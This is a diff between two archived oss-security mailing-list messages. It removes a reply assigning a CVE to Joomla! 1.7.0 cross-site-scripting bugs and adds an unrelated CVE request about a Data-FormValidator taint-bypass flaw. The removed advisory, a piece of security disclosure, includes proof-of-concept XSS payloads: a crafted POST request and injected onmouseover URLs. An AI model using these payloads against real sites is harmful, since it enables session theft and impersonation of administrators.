@@ -1,158 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/04/7
-Message-ID: <85aa3709-c24c-4e0c-beef-cc38b1ac0b5d@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Tue, 04 Oct 2011 14:04:21 -0400 (EDT)
-From: Josh Bressers <bressers@...hat.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE Request: Joomla! 1.7.0 | Multiple Cross Site Scripting (XSS) Vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/12/3
+Message-ID: <4DF4D1FD.7070604@redhat.com>
+Date: Sun, 12 Jun 2011 16:49:33 +0200
+From: Jan Lieskovsky <jlieskov@...hat.com>
+To: "Steven M. Christey" <coley@...us.mitre.org>
+CC: oss-security@...ts.openwall.com, Damyan Ivanov <dmn@...ian.org>, Mark Stosberg <mark@...mersault.com>, 629511@...s.debian.org, Iain Arnell <iarnell@...il.com>, Marcela Maslanova <mmaslano@...hat.com>
+Subject: CVE Request -- Data-FormValidator -- Reports invalid field as valid when untaint_all_constraints used
 Content-Type: text/plain; charset=utf-8
 
-Please use CVE-2011-3595
+Hello, Josh, Steve, vendors,
 
-Thanks.
+   It was found that perl-Data-FormValidator, a HTML form user input
+validator, used to treat certain invalid fields as valid, when the
+untaint_all_constraints directive was used (default for majority of
+Data-FormValidator routines). A remote attacker could use this flaw to
+bypass perl Taint mode protection mechanism via specially-crafted input
+provided to the HTML form.
 
--- 
-    JB
+Note: Hopefully Damyan, Mark can clarify here, if valid data from
+       Data-FormValidator are automatically marked as untainted for
+       perl Taint mode or not. If there still is perl Taint mode
+       protection check present, even on valid Data-FormValidator
+       data and it couldn't happen, that tainted data would be passed
+       further to the script processing, then this is not a security
+       issue.
 
+References:
+[1] http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=629511
+[2] https://rt.cpan.org/Public/Bug/Display.html?id=61792
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=712694
 
------ Original Message -----
-> Joomla! 1.7.0 | Multiple Cross Site Scripting (XSS) Vulnerabilities
-> 
-> 
-> 
-> 1. OVERVIEW
-> 
-> Joomla! 1.7.0 (stable version) is vulnerable to multiple Cross Site
-> Scripting issues.
-> 
-> 
-> 2. BACKGROUND
-> 
-> Joomla is a free and open source content management system (CMS) for
-> publishing content on the World Wide Web and intranets. It comprises
-> a
-> model–view–controller (MVC) Web application framework that can also
-> be
-> used independently.
-> Joomla is written in PHP, uses object-oriented programming (OOP)
-> techniques and software design patterns, stores data in a MySQL
-> database, and includes features such as page caching, RSS feeds,
-> printable versions of pages, news flashes, blogs, polls, search, and
-> support for language internationalization.
-> 
-> 
-> 3. VULNERABILITY DESCRIPTION
-> 
-> Several parameters (searchword, extension, asset, author ) in Joomla!
-> Core components are not properly sanitized upon submission to the
-> /index.php url, which allows attacker to conduct Cross Site Scripting
-> attack. This may allow an attacker to create a specially crafted URL
-> that would execute arbitrary script code in a victim's browser.
-> 
-> 
-> 4. VERSION AFFECTED
-> 
-> 1.7.0 <=
-> 
-> 
-> 5. PROOF-OF-CONCEPT/EXPLOIT
-> 
-> 
-> component: com_search, parameter: searchword (Browser: IE, Konqueror)
-> =====================================================================
-> This is our previously reported issue -
-> http://bl0g.yehg.net/2011/07/joomla-170-rc-and-lower-multiple-cross.html
-> http://bl0g.yehg.net/2011/06/joomla-163-and-lower-multiple-cross.html
-> We have no idea what made Joomla! guys so difficult to fix this
-> issue.
-> 
-> 
-> [REQUEST]
-> POST /joomla17_noseo/index.php HTTP/1.1
-> Host: localhost
-> Accept: */*
-> Accept-Language: en
-> User-Agent: MSIE 8.0
-> Connection: close
-> Referer: http://localhost/joomla17_noseo
-> 
-> Content-Type: application/x-www-form-urlencoded
-> Content-Length: 456
-> 
-> 
-> task=search&Itemid=435&searchword=Search';onunload=function(){x=confirm(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,97,32,109,101,115,115,97,103,101,32,102,114,111,109,32,65,100,109,105,110,105,115,116,114,97,116,111,114,33,10,68,111,32,121,111,117,32,119,97,110,116,32,116,111,32,103,111,32,116,111,32,73,110,98,111,120,63));alert(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,88,83,83,33));};//xsssssssssss&option=com_search
-> [/REQUEST]
-> 
-> 
-> ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-> 
-> User Login is required to execute the following XSSes.
-> 
-> 
-> Parameter: extension, Component: com_categories
-> ====================================================
-> 
-> http://localhost/joomla17_noseo/administrator/index.php?option=com_categories&extension=com_content%20%22onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22%20x=%22
-> 
-> 
-> 
-> Parameter: asset , Component: com_media
-> ====================================================
-> 
-> http://localhost/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22&author=
-> 
-> 
-> 
-> Parameter: author, Component: com_media
-> ====================================================
-> 
-> http://localhost/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=&author=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22
-> 
-> 
-> 
-> ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-> 
-> 
-> 6. IMPACT
-> 
-> Attackers can compromise currently logged-in user/administrator
-> session and impersonate arbitrary user actions available under
-> /administrator/ functions.
-> 
-> 
-> 7. SOLUTION
-> 
-> Upgrade to Joomla! 1.7.1-stable or higher.
-> 
-> 
-> 8. VENDOR
-> 
-> Joomla! Developer Team
-> http://www.joomla.org
-> 
-> 
-> 9. CREDIT
-> 
-> This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-> Ethical Hacker Group, Myanmar.
-> 
-> 
-> 10. DISCLOSURE TIME-LINE
-> 
-> 2011-07-29: notified vendor
-> 2011-09-26: patched version, 1.7.1-stable, released
-> 2011-09-29: vulnerability disclosed
-> 
-> 
-> 11. REFERENCES
-> 
-> Original Advisory URL:
-> http://yehg.net/lab/pr0js/advisories/joomla/core/%5Bjoomla_1.7.0-stable%5D_cross_site_scripting%28XSS%29
-> 
-> Vendor Advisory URLs:
-> http://developer.joomla.org/security/news/367-20110901-core-xss-vulnerability
-> http://developer.joomla.org/security/news/368-20110902-core-xss-vulnerability
-> 
-> 
-> #yehg [2011-09-29]
-> 
+Could you allocate a CVE id for this?
+
+Thank you & Regards, Jan.
+--
+Jan iankko Lieskovsky / Red Hat Security Response Team
